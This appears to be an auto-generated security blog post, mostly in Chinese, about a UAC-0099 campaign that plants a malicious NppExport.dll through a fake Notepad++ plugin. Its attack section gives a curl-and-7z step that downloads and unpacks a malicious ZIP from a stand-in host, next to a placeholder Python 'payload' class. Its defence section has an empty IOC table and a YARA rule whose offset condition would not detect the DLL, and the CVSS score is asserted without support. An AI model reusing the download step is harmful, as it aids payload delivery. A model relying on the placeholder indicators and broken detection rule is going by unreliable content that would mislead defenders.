---
layout: post
title:  "Fake Notepad++ Plugin Delivers MATCHBOIL.V2 in UAC-0099 Attacks"
date:   2026-07-24 08:12:23 +0000
categories: [security]
severity: critical
---

# 🚨 解析 UAC-0099 集團的 Notepad++ 插件攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DLL Hijacking, Code Obfuscation, Persistence Mechanism

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: UAC-0099 集團利用 Notepad++ 的 DLL Hijacking 漏洞，通過創建一個惡意的 DLL 文件 (`NppExport.dll`) 來實現 RCE。
* **攻擊流程圖解**:
  1. 攻擊者發送一封含有惡意附件的電子郵件。
  2. 受害者打開附件，啟動惡意的 VBScript。
  3. VBScript 下載並解壓縮一個 ZIP 文件，包含 Notepad++ 和惡意的 DLL 文件。
  4. Notepad++ 啟動，載入惡意的 DLL 文件。
  5. 惡意的 DLL 文件實現 RCE，下載並執行額外的惡意代碼。
* **受影響元件**: Notepad++ 8.8.3 版本，Windows 系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要啟動惡意的 VBScript。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意的 DLL 文件結構
      class MaliciousDLL:
          def __init__(self):
              self.dll_name = "NppExport.dll"
              self.dll_code = b"...惡意代碼..."
    
          def inject(self):
              # 實現 DLL Hijacking
              # ...
    
    ```
  *範例指令*: 使用 `curl` 下載惡意的 ZIP 文件，然後使用 `7z` 解壓縮。

```

bash
  curl -o malicious.zip http://example.com/malicious.zip
  7z x malicious.zip

```
* **繞過技術**: 使用 Code Obfuscation 技術來隱藏惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Malicious_DLL {
          meta:
              description = "惡意的 DLL 文件"
              author = "..."
          strings:
              $dll_name = "NppExport.dll"
          condition:
              $dll_name at 0
      }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic):

```

sql
  index=security sourcetype=windows_eventlog EventID=4688 | search "NppExport.dll"

```
* **緩解措施**: 更新 Notepad++ 到最新版本，禁用不必要的 DLL 文件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL Hijacking (DLL 劫持)**: 惡意的 DLL 文件替換合法的 DLL 文件，實現 RCE。
* **Code Obfuscation (代碼混淆)**: 使用各種技術來隱藏惡意代碼，難以被偵測。
* **Persistence Mechanism (持久性機制)**: 惡意代碼通過各種方式實現持久性，例如通過注册表或啟動項。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/fake-notepad-plugin-delivers.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1574/)


